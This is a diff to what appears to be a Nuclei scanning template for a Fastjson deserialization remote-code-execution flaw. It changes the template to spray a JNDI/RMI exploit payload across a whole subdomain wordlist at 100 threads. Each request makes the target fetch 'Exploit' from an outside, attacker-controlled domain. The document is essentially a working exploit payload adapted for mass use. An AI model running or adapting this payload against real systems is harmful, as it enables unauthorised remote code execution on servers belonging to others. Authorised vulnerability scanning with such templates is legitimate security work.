@@ -9,12 +9,16 @@ info:
     - https://github.com/wyzxxz/fastjson_rce_tool
   tags: fastjson,rce,deserialization,oast
 
-
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST / HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
         Accept: */*
         Accept-Encoding: gzip, deflate
@@ -22,5 +26,5 @@ requests:
 
         {
            "@type":"org.apache.shiro.jndi.JndiObjectFactory",
-           "resourceName":"rmi://{{Host}}.{{Port}}.{{Hostname}}.fastjson.{{MY-DOMAIN}}/Exploit"
+           "resourceName":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit"
         }
